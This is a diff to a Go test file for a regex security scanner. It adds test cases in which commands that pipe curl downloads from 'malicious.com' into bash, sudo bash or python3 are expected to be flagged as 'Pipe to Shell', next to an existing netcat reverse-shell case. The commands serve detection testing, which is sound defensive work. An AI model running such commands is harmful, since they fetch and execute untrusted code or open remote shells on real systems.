@@ -52,6 +52,26 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "nc -e /bin/sh 10.0.0.1 1234",
 			wantFinding: "Reverse Shell",
 		},
+		{
+			name:        "Curl Pipe Sudo Bash",
+			content:     "curl https://malicious.com/install.sh | sudo bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Curl Pipe Abs Path Bash",
+			content:     "curl https://malicious.com/install.sh | /bin/bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Curl Pipe Env Bash",
+			content:     "curl https://malicious.com/install.sh | env bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Curl Pipe Python3",
+			content:     "curl https://malicious.com/script.py | python3",
+			wantFinding: "Pipe to Shell",
+		},
 	}
 
 	for _, tt := range tests {
